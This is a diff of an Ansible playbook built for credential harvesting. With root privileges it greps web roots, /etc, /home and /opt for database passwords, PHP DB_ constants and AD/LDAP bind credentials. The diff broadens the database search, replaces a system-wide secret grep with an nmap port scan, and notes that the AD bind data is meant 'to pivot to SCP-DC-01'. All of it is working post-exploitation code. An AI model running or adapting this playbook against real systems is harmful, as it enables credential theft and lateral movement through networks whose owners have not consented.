@@ -3,25 +3,23 @@
 - name: Extract Database and Web Credentials
   become: yes
   shell: |
-    # Reduced filtering: Now scans all of /var/www and /etc/mysql
-    # Only excludes binary assets and node_modules
-    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null \
-    | grep -vE "(\.png|\.jpg|\.svg|\.gif|node_modules/|vendor/)" \
+    # Scans everything in /var/www and /etc/mysql with zero directory exclusions
+    # Captures both assignment styles (key=val) and PHP define styles
+    (grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null; \
+     grep -rEho "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null) \
+    | grep -vE "(\.png|\.jpg|\.svg|\.gif)" \
     | sort -u
   register: db_results
   failed_when: false
   changed_when: false
 
-# SECTION 2: SYSTEM & SERVICE CREDENTIALS
-- name: Extract System and VPN Credentials
+# SECTION 2: SYSTEM PORT SCAN (Replaces VPN)
+- name: Scan for Open Service Ports
   become: yes
   shell: |
-    # Broadened search to include all of /etc and /home
-    # Captures any assignment to password-like keys
-    grep -rEo "(password|passwd|auth_user|secret|key_pass|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /etc /home 2>/dev/null \
-    | grep -vE "(passwd: files|passwd: False|\.js|\.css)" \
-    | sort -u
-  register: system_results
+    # Fast scan of the top 1000 ports to identify running services
+    nmap -sT -T4 --open {{ inventory_hostname }} | grep "tcp open"
+  register: port_scan_results
   failed_when: false
   changed_when: false
 
@@ -29,7 +27,7 @@
 - name: Extract AD and LDAP Bind Info
   become: yes
   shell: |
-    # Global search for AD/LDAP strings across the entire filesystem
+    # Global search for AD/LDAP strings to pivot to SCP-DC-01
     grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)[:=]\s*[^ \t\n;]+" /etc /var/www /opt 2>/dev/null \
     | sort -u
   register: ad_bind_results
@@ -46,8 +44,8 @@
       [DATABASE & WEB AUTH]
       {{ db_results.stdout if db_results.stdout != "" else "None found" }}
 
-      [SSH, VPN & SYSTEM SECRETS]
-      {{ system_results.stdout if system_results.stdout != "" else "None found" }}
+      [OPEN PORTS]
+      {{ port_scan_results.stdout if port_scan_results.stdout != "" else "No open ports found" }}
 
       [AD/LDAP BIND CONFIGS]
       {{ ad_bind_results.stdout if ad_bind_results.stdout != "" else "None found" }}
@@ -60,8 +58,8 @@
     msg:
       - "--- DB/WEB (Apache/MySQL) ---"
       - "{{ db_results.stdout_lines | default(['None']) }}"
-      - "--- SYSTEM (SSH/VPN) ---"
-      - "{{ system_results.stdout_lines | default(['None']) }}"
+      - "--- OPEN PORTS ---"
+      - "{{ port_scan_results.stdout_lines | default(['None']) }}"
       - "--- AD BIND INFO ---"
       - "{{ ad_bind_results.stdout_lines | default(['None']) }}"
 
